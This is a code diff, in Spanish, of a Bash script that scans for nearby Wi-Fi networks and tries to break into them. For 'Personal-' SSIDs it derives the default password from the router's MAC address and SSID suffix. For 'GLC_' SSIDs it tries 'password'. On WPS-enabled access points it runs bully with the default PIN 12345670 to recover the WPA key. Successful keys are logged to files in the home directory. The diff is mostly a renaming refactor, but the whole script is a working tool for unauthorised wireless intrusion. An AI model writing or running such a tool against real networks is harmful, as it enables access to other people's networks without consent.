@@ -15,6 +15,12 @@ DELAY=10s
 
 TMP="/tmp/redes.txt"
 
+# Verificar si el script se ejecuta con privilegios de root
+if [ "$EUID" -ne 0 ]; then
+	echo -e "\n${RED}[ERROR]${RESET} Este script debe ejecutarse con sudo o como root.${RESET}"
+	exit 1
+fi
+
 # Chequeo de dependencias
 REQUIRED_CMDS=(iw iwlist wpa_passphrase wpa_supplicant timeout bully pkill awk sed grep ip)
 declare -A PKG_MAP=(
@@ -31,24 +37,24 @@ declare -A PKG_MAP=(
   [ip]=iproute2
 )
 
-missing=()
-pkgs=()
-for cmd in "${REQUIRED_CMDS[@]}"; do
-  if ! command -v "$cmd" >/dev/null 2>&1; then
-    missing+=("$cmd")
-    pkg="${PKG_MAP[$cmd]:-$cmd}"
-    # evitar duplicados en pkgs
-    case " ${pkgs[*]} " in
-      *" $pkg "*) ;;
-      *) pkgs+=("$pkg") ;;
+MISSING=()
+PKGS=()
+for CMD in "${REQUIRED_CMDS[@]}"; do
+  if ! command -v "$CMD" >/dev/null 2>&1; then
+    MISSING+=("$CMD")
+    PKG="${PKG_MAP[$CMD]:-$CMD}"
+    # evitar duplicados en PKGS
+    case " ${PKGS[*]} " in
+      *" $PKG "*) ;;
+      *) PKGS+=("$PKG") ;;
     esac
   fi
 done
 
-if [ "${#missing[@]}" -ne 0 ]; then
-  echo -e "\n[ERROR] Faltan dependencias: ${missing[*]}"
+if [ "${#MISSING[@]}" -ne 0 ]; then
+  echo -e "\n[ERROR] Faltan dependencias: ${MISSING[*]}"
   echo "Instálalas en Debian/Ubuntu con:"
-  echo "  sudo apt-get update && sudo apt-get install -y ${pkgs[*]}"
+  echo "sudo apt-get update && sudo apt-get install -y ${PKGS[*]}"
   exit 1
 fi
 
@@ -96,33 +102,29 @@ banner() {
 
 spinner() {
 
-	local chars=("\\" "|" "/" "-")
-	local delay=0.1
-	local i=0
+	local CHARS=("\\" "|" "/" "-")
+	local SPINNER_DELAY=0.1
+	local I=0
 
 	while true; do
-		local index=$((i % 4))
-		local char=${chars[$index]}
-		printf "\rProcesando... %s" "$char"
-		i=$((i + 1))
-		sleep $delay
+		local INDEX=$((I % 4))
+		local CHAR=${CHARS[$INDEX]}
+		printf "\rProcesando... %s" "$CHAR"
+		I=$((I + 1))
+		sleep $SPINNER_DELAY
 	done
 }
 
 es_mac_valida() {
-	local mac="$1"
-	[[ "$mac" =~ ^([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}$ ]] && [[ "$mac" != "00:00:00:00:00:00" ]]
+	local MAC="$1"
+	[[ "$MAC" =~ ^([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}$ ]] && [[ "$MAC" != "00:00:00:00:00:00" ]]
 }
 
 if [ $# -ne 1 ]; then
 	uso
 fi
 
-# Verificar si el script se ejecuta con privilegios de root
-if [ "$EUID" -ne 0 ]; then
-	echo -e "\n${RED}[ERROR]${RESET} Este script debe ejecutarse con sudo o como root.${RESET}"
-	exit 1
-fi
+
 
 # Determina la interfaz inalámbrica por defecto si no se pasa como parámetro
 #if [ -z "$INTERFACE" ]; then
@@ -147,25 +149,25 @@ function intentoConexionWPS() {
 	SENIAL=$5
 
 	if es_mac_valida "$MAC"; then
-		echo -e "\n\n${BLUE}${BOLD}📡 Probando${RESET}: ${BOLD}${MAC}${RESET} ${BLUE}(ESSID: ${BOLD}${ESSID}${RESET}${BLUE}, Canal: ${BOLD}${CHAN}${RESET}${BLUE}, Señal: -${BOLD}${SENIAL} dBm${RESET}${BLUE})${RESET}\n\n"
+		echo -e "\n\n${BLUE}${BOLD}📡 Probando${RESET}: ${BOLD}${MAC}${RESET} ${BLUE}(ESSID: ${BOLD}${ESSID}${RESET}${BLUE}, Canal: ${BOLD}${CHAN}${RESET}${BLUE}, Señal: -${BOLD}${SENIAL} dBm${RESET}${BLUE})${RESET}"
 	fi
 
 	timeout $DELAY bully -b "$MAC" -B -p "$PIN" -v3 "$INTERFACE" | tee -a "/tmp/bully_output.log" | {
-		timeout_count=0
+		TIMEOUT_COUNT=0
 
-		while IFS= read -r line; do
+		while IFS= read -r LINE; do
 
 			# Contador de timeouts
-			if [[ "$line" == *"Tx(DeAuth) = 'Timeout'"* ]]; then
-				((timeout_count++))
+			if [[ "$LINE" == *"Tx(DeAuth) = 'Timeout'"* ]]; then
+				((TIMEOUT_COUNT++))
 			fi
 
-			if [[ "$line" == *"Rx("*"Assn"*") = 'Timeout'"* ]]; then
-				((timeout_count++))
+			if [[ "$LINE" == *"Rx("*"Assn"*") = 'Timeout'"* ]]; then
+				((TIMEOUT_COUNT++))
 			fi
 
 			# Errores fatales
-			if [[ "$line" == *"WPS locked"* || "$line" == *"WPS transaction failed"* || "$line" == *"Too many failed attempts"* || "$line" == *"failed to associate"* ]]; then
+			if [[ "$LINE" == *"WPS locked"* || "$LINE" == *"WPS transaction failed"* || "$LINE" == *"Too many failed attempts"* || "$LINE" == *"failed to associate"* ]]; then
 				echo -e "\n${YELLOW}Conectarse (WPS) a ${BOLD}${ESSID}${RESET}${YELLOW} con la Clave: ${BOLD}${PIN}${RESET}${YELLOW} y MACAddress: ${BOLD}${MAC}${RESET} --> ${RED}[FALLÓ]${RESET}\n"
 				echo "[$(date '+%F %T')] FAIL  | ${MAC} | ${ESSID} | ${PIN}" >>"$HOME/wifiwps-sin-password-por-defecto.txt"
 				pkill -f "bully.*$MAC"
@@ -173,8 +175,8 @@ function intentoConexionWPS() {
 			fi
 
 			# Éxito: clave encontrada
-			if [[ "$line" == *"key"* || "$line" == *"KEY"* ]]; then
-				KEY=$(echo "$line" | cut -d"'" -f4)
+			if [[ "$LINE" == *"key"* || "$LINE" == *"KEY"* ]]; then
+				KEY=$(echo "$LINE" | cut -d"'" -f4)
 				echo -e "\n${GREEN}${BOLD}[✓] PIN correcto para ${RESET}${BOLD}${MAC}${RESET}${GREEN} - PIN: ${RESET}${BOLD}${PIN}${RESET}${GREEN} - KEY: ${RESET}${BOLD}${KEY}${RESET}"
 				echo -e "\n${YELLOW}Conectarse (WPS) a ${BOLD}${ESSID}${RESET}${YELLOW} con la Clave: ${RESET}${BOLD}${KEY}${RESET}${YELLOW} y MACAddress: ${RESET}${BOLD}${MAC}${RESET} --> ${GREEN}${BOLD}[OK]${RESET}\n"
 				echo "[$(date '+%F %T')] OK  | ${MAC} | ${ESSID} | ${PIN}| ${KEY}" >>"$HOME/wifiwps-password-default.txt"
@@ -183,7 +185,7 @@ function intentoConexionWPS() {
 			fi
 
 			# Demasiados timeouts
-			if [[ $timeout_count -ge 3 ]]; then
+			if [[ $TIMEOUT_COUNT -ge 3 ]]; then
 
 				echo -e "\n${YELLOW}Conectarse (WPS) a ${BOLD}${ESSID}${RESET}${YELLOW} con la Clave: ${BOLD}${PIN}${RESET}${YELLOW} y MACAddress: ${BOLD}${MAC}${RESET} --> ${RED}${BOLD}[FALLÓ]${RESET}\n"
 				echo "[$(date '+%F %T')] FAIL  | ${MAC} | ${ESSID} | ${PIN}" >>"$HOME/wifiwps-sin-password-por-defecto.txt"
@@ -207,59 +209,59 @@ function intentoConexionWPS() {
 }
 
 function IntentoConexion() {
-	ssid="$1"
-	clave="$2"
-	macaddress="$3"
-	interface="$4"
+	SSID="$1"
+	CLAVE="$2"
+	MACADDRESS="$3"
+	INTERF="$4"
 
 	modomanager
 
 	rm -f /tmp/wpa_supplicant.conf /tmp/wpa_respuesta.log 2>/dev/null
 
 	# Generar configuración wpa_supplicant (silenciado en pantalla)
-	wpa_passphrase "$ssid" "$clave" | tee /tmp/wpa_supplicant.conf >/dev/null 2>&1
+	wpa_passphrase "$SSID" "$CLAVE" | tee /tmp/wpa_supplicant.conf >/dev/null 2>&1
 
 	# Ejecutar wpa_supplicant con timeout y guardar salida en log temporal
-	timeout $DELAY wpa_supplicant -i "$interface" -c /tmp/wpa_supplicant.conf >/tmp/wpa_respuesta.log 2>&1 || true
+	timeout $DELAY wpa_supplicant -i "$INTERF" -c /tmp/wpa_supplicant.conf >/tmp/wpa_respuesta.log 2>&1 || true
 
 	# Comprobar resultado
 	if grep -qi "CTRL-EVENT-CONNECTED" /tmp/wpa_respuesta.log; then
-		echo -e "\n${YELLOW}Conectarse (WPAx) a ${BOLD}${ssid}${RESET}${YELLOW} con la Clave: ${RESET}${BOLD}${clave}${RESET}${YELLOW} y MACAddress: ${RESET}${BOLD}${macaddress}${RESET} --> ${GREEN}${BOLD}[OK]${RESET}\n"
-		echo "[$(date '+%F %T')] OK  | ${macaddress} | ${ssid} | ${clave}" >>"$HOME/wifi-password-default.txt"
+		echo -e "\n${YELLOW}Conectarse (WPAx) a ${BOLD}${SSID}${RESET}${YELLOW} con la Clave: ${RESET}${BOLD}${CLAVE}${RESET}${YELLOW} y MACAddress: ${RESET}${BOLD}${MACADDRESS}${RESET} --> ${GREEN}${BOLD}[OK]${RESET}\n"
+		echo "[$(date '+%F %T')] OK  | ${MACADDRESS} | ${SSID} | ${CLAVE}" >>"$HOME/wifi-password-default.txt"
 
 	else
 		# Determinar razón más específica (si existe)
 		if grep -qi "CTRL-EVENT-AUTH-REJECT" /tmp/wpa_respuesta.log; then
-			reason_color="${RED}[ERROR] Contraseña incorrecta${RESET}"
-			reason_plain="ERROR: Contraseña incorrecta"
+			REASON_COLOR="${RED}[ERROR] Contraseña incorrecta${RESET}"
+			REASON_PLAIN="ERROR: Contraseña incorrecta"
 		elif grep -qi "CTRL-EVENT-NETWORK-NOT-FOUND" /tmp/wpa_respuesta.log; then
-			reason_color="${RED}[ERROR] Red no encontrada${RESET}"
-			reason_plain="ERROR: Red no encontrada"
+			REASON_COLOR="${RED}[ERROR] Red no encontrada${RESET}"
+			REASON_PLAIN="ERROR: Red no encontrada"
 		else
-			reason_color="${YELLOW}[?] Estado desconocido${RESET}"
-			reason_plain="WARN: Estado desconocido"
+			REASON_COLOR="${YELLOW}[?] Estado desconocido${RESET}"
+			REASON_PLAIN="WARN: Estado desconocido"
 		fi
 
-		echo -e "\n${YELLOW}Conectarse (WPAx) a ${BOLD}${ssid}${RESET}${YELLOW} con la Clave: ${BOLD}${clave}${RESET}${YELLOW} y MACAddress: ${BOLD}${macaddress}${RESET} --> ${RED}${BOLD}[FALLÓ]${RESET}\n"
-		echo "[$(date '+%F %T')] FAIL | ${macaddress} | ${ssid} | ${clave} | ${reason_plain}" >>"$HOME/wifi-sin-password-por-defecto.txt"
+		echo -e "\n${YELLOW}Conectarse (WPAx) a ${BOLD}${SSID}${RESET}${YELLOW} con la Clave: ${BOLD}${CLAVE}${RESET}${YELLOW} y MACAddress: ${BOLD}${MACADDRESS}${RESET} --> ${RED}${BOLD}[FALLÓ]${RESET}\n"
+		echo "[$(date '+%F %T')] FAIL | ${MACADDRESS} | ${SSID} | ${CLAVE} | ${REASON_PLAIN}" >>"$HOME/wifi-sin-password-por-defecto.txt"
 
 	fi
 
 }
 
 function MostrarRed() {
-	essid=$1
-	clave=$2
-	macaddress=$3
-	canal=$4
-	INTERFACE=$5
-	WPS_FOUND=$6
+	ESSID="$1"
+	CLAVE="$2"
+	MACADDRESS="$3"
+	CANAL="$4"
+	INTERFACE="$5"
+	WPS_FOUND="$6"
 	echo -e "\n"
 	echo -e "${GREEN}[RESULTADO]${RESET} Red $([[ $WPS_FOUND -eq 1 ]] && echo 'WPS' || echo 'WPAx') encontrada:"
-	echo -e "   SSID     : ${BOLD}$essid${RESET}"
-	echo -e "   MacAddress : ${BOLD}$macaddress${RESET}"
-	echo -e "   Canal : ${BOLD}$canal${RESET}"
-	echo -e "   Password : ${BOLD}$clave${RESET}"
+	echo -e "   SSID     : ${BOLD}$ESSID${RESET}"
+	echo -e "   MacAddress : ${BOLD}$MACADDRESS${RESET}"
+	echo -e "   Canal : ${BOLD}$CANAL${RESET}"
+	echo -e "   Password : ${BOLD}$CLAVE${RESET}"
 	echo -e "   INTERFACE  : ${BOLD}$INTERFACE${RESET}"
 
 }
@@ -272,20 +274,20 @@ function borrarTemporales() {
 }
 
 function bloqueCompleto() {
-	local blk="$1"
+	local BLK="$1"
 
 	# Requisitos mínimos: Address, ESSID, Channel/Frequency
-	if ! echo "$blk" | grep -qi 'address:'; then
+	if ! echo "$BLK" | grep -qi 'address:'; then
 		return 1
 	fi
-	if ! echo "$blk" | grep -qi 'essid:'; then
+	if ! echo "$BLK" | grep -qi 'essid:'; then
 		return 1
 	fi
-	if ! (echo "$blk" | grep -qi 'channel:' || echo "$blk" | grep -qi 'frequency:'); then
+	if ! (echo "$BLK" | grep -qi 'channel:' || echo "$BLK" | grep -qi 'frequency:'); then
 		return 1
 	fi
 
-	if ! echo "$blk" | egrep -qi 'ie:|unknown:|encryption key:'; then
+	if ! echo "$BLK" | egrep -qi 'ie:|unknown:|encryption key:'; then
 		return 1
 	fi
 
@@ -296,7 +298,7 @@ banner
 echo -e "\n${GREEN}[OK]${RESET} Interfaz detectada: ${BOLD}$INTERFACE${RESET}"
 
 # --- Escaneo de redes WiFi ---
-echo -e "\n${BLUE}[INFO]${RESET} Iniciando escaneo de redes en ${BOLD}$INTERFAZ${RESET}..."
+echo -e "\n${BLUE}[INFO]${RESET} Iniciando escaneo de redes en ${BOLD}$INTERFACE${RESET}..."
 
 borrarTemporales
 
@@ -309,81 +311,81 @@ while true; do
 	awk '/Cell /{print ""; print $0; next} {print}' "$TMP" |
 
 		# Leer bloque por bloque
-		while IFS= read -r line; do
-			if [[ -z "$line" ]]; then
-				if [[ -n "$bloque" ]]; then
-					if bloqueCompleto "$bloque"; then
-						essid=""
-						macaddress=""
-						senial=""
-						mac=""
-						canal=""
-						subssid=""
-						clave=""
-						echo "$bloque" | while read line; do
+		while IFS= read -r LINE; do
+			if [[ -z "$LINE" ]]; then
+				if [[ -n "$BLOQUE" ]]; then
+					if bloqueCompleto "$BLOQUE"; then
+						ESSID=""
+						MACADDRESS=""
+						SENIAL=""
+						MAC=""
+						CANAL=""
+						SUBSSID=""
+						CLAVE=""
+						echo "$BLOQUE" | while read LINE; do
 
-							essid=$(echo "$bloque" | sed -n 's/.*ESSID:"\(.*\)".*/\1/ip' | head -n1)
+							ESSID=$(echo "$BLOQUE" | sed -n 's/.*ESSID:"\(.*\)".*/\1/ip' | head -n1)
 
-							enc=$(echo "$bloque" | grep -i 'encryption key:' | head -n1 || true)
+							ENC=$(echo "$BLOQUE" | grep -i 'encryption key:' | head -n1 || true)
 
 							# Detectar la línea con la dirección MAC
-							if [[ "$line" =~ Cell\ [0-9]+\ -\ Address:\ ([A-Fa-f0-9:]{17}) ]]; then
-								macaddress="${BASH_REMATCH[1]}"
-								mac=$(echo "$macaddress" | sed 's/://g' | awk '{print substr($0,3,7)}')
+							if [[ "$LINE" =~ Cell\ [0-9]+\ -\ Address:\ ([A-Fa-f0-9:]{17}) ]]; then
+								MACADDRESS="${BASH_REMATCH[1]}"
+								MAC=$(echo "$MACADDRESS" | sed 's/://g' | awk '{print substr($0,3,7)}')
 							fi
 
 							# Detectar la línea del nivel de señal
-							if [[ "$line" =~ Signal\ level=(-?[0-9]+) ]]; then
-								senial="${BASH_REMATCH[1]}"
+							if [[ "$LINE" =~ Signal\ level=(-?[0-9]+) ]]; then
+								SENIAL="${BASH_REMATCH[1]}"
 
 							fi
-							if [[ "$line" =~ Channel: ]]; then
-								canal=$(echo "$line" | sed -n 's/.*Channel:\(.*\)/\1/p' | xargs)
+							if [[ "$LINE" =~ Channel: ]]; then
+								CANAL=$(echo "$LINE" | sed -n 's/.*Channel:\(.*\)/\1/p' | xargs)
 							fi
-							if [ -n "$senial" ] && [ "$senial" -ge "$TOPSENIAL" ]; then
+							if [ -n "$SENIAL" ] && [ "$SENIAL" -ge "$TOPSENIAL" ]; then
 
-								if [[ "$line" =~ ESSID:\"([Pp]ersonal-[^\"]+)\" ]]; then
-									essid=$(echo $line | grep "ESSID: *" | awk -F: '{print $2}' | sed 's/"//g')
-									subssid=$(echo "$essid" | grep -Po 'Personal(?:-WiFi)?-\K[A-Za-z0-9]{3}(?![a-zA-Z0-9])')
-									clave=$(echo "$mac$subssid")
+								if [[ "$LINE" =~ ESSID:\"([Pp]ersonal-[^\"]+)\" ]]; then
+									ESSID=$(echo $LINE | grep "ESSID: *" | awk -F: '{print $2}' | sed 's/"//g')
+									SUBSSID=$(echo "$ESSID" | sed -nE 's/.*[Pp]ersonal(-wifi)?[- ]([A-Za-z0-9]{2,4}).*/\2/p')
+									CLAVE=$(echo "$MAC$SUBSSID")
 
-									if [ ! "$(grep -i "$macaddress" $HOME/wifi-sin-password-por-defecto.txt 2>/dev/null)" ] && [ ! "$(grep -i "$macaddress" $HOME/wifi-password-default.txt 2>/dev/null)" ]; then
+									if [ ! "$(grep -i "$MACADDRESS" $HOME/wifi-sin-password-por-defecto.txt 2>/dev/null)" ] && [ ! "$(grep -i "$MACADDRESS" $HOME/wifi-password-default.txt 2>/dev/null)" ]; then
 
-										MostrarRed "$essid" "$clave" "$macaddress" "$canal" "$INTERFACE"
+										MostrarRed "$ESSID" "$CLAVE" "$MACADDRESS" "$CANAL" "$INTERFACE"
 
-										IntentoConexion "$essid" "$clave" "$macaddress" "$INTERFACE"
+										IntentoConexion "$ESSID" "$CLAVE" "$MACADDRESS" "$INTERFACE"
 
 									fi
 
 								fi
-								if [[ "$line" =~ ESSID:\"(GLC_.*)\" ]]; then
-									essid=$(echo $line | grep "ESSID: *" | awk -F: '{print $2}')
-									clave=$"password"
+								if [[ "$LINE" =~ ESSID:\"(GLC_.*)\" ]]; then
+									ESSID=$(echo $LINE | grep "ESSID: *" | awk -F: '{print $2}')
+									CLAVE="password"
 
-									if [ ! "$(grep -i "$macaddress" $HOME/wifi-sin-password-por-defecto.txt 2>/dev/null)" ] && [ ! "$(grep -i "$macaddress" $HOME/wifi-password-default.txt 2>/dev/null)" ]; then
+									if [ ! "$(grep -i "$MACADDRESS" $HOME/wifi-sin-password-por-defecto.txt 2>/dev/null)" ] && [ ! "$(grep -i "$MACADDRESS" $HOME/wifi-password-default.txt 2>/dev/null)" ]; then
 
-										MostrarRed "$essid" "$clave" "$macaddress" "$canal" "$INTERFACE"
+										MostrarRed "$ESSID" "$CLAVE" "$MACADDRESS" "$CANAL" "$INTERFACE"
 
-										IntentoConexion "$essid" "$clave" $macaddress "$INTERFACE"
+										IntentoConexion "$ESSID" "$CLAVE" $MACADDRESS "$INTERFACE"
 
 									fi
 
 								fi
-								line_lc=$(echo "$line" | tr '[:upper:]' '[:lower:]')
+								LINE_LC=$(echo "$LINE" | tr '[:upper:]' '[:lower:]')
 
-								enc_lc=$(echo "$enc" | tr '[:upper:]' '[:lower:]')
+								ENC_LC=$(echo "$ENC" | tr '[:upper:]' '[:lower:]')
 
-								if echo "$line_lc" | grep -qiE 'wps|0050f2|00:50:f2'; then
-									if [[ -n "$enc_lc" && "$enc_lc" != *off* ]]; then
+								if echo "$LINE_LC" | grep -qiE 'wps|0050f2|00:50:f2'; then
+									if [[ -n "$ENC_LC" && "$ENC_LC" != *off* ]]; then
 										WPS_FOUND=1
 										PIN="12345670"
 
-										if ! grep -iqF "$macaddress" "$HOME/wifiwps-sin-password-por-defecto.txt" 2>/dev/null &&
-											! grep -iqF "$macaddress" "$HOME/wifiwps-password-default.txt" 2>/dev/null; then
+										if ! grep -iqF "$MACADDRESS" "$HOME/wifiwps-sin-password-por-defecto.txt" 2>/dev/null &&
+											! grep -iqF "$MACADDRESS" "$HOME/wifiwps-password-default.txt" 2>/dev/null; then
 
-											MostrarRed "$essid" "$PIN" "$macaddress" "$canal" "$INTERFACE" "$WPS_FOUND"
+											MostrarRed "$ESSID" "$PIN" "$MACADDRESS" "$CANAL" "$INTERFACE" "$WPS_FOUND"
 											modomonitor
-											intentoConexionWPS "$essid" "$PIN" "$macaddress" "$canal" "$senial" "$INTERFACE"
+											intentoConexionWPS "$ESSID" "$PIN" "$MACADDRESS" "$CANAL" "$SENIAL" "$INTERFACE"
 											WPS_FOUND=0
 										fi
 									fi
@@ -392,11 +394,11 @@ while true; do
 
 						done
 					fi
-					bloque=""
+					BLOQUE=""
 				fi
 			else
 				# acumular línea en el bloque actual
-				bloque+="$line"$'\n'
+				BLOQUE+="$LINE"$'\n'
 			fi
 		done < <(cat)
 
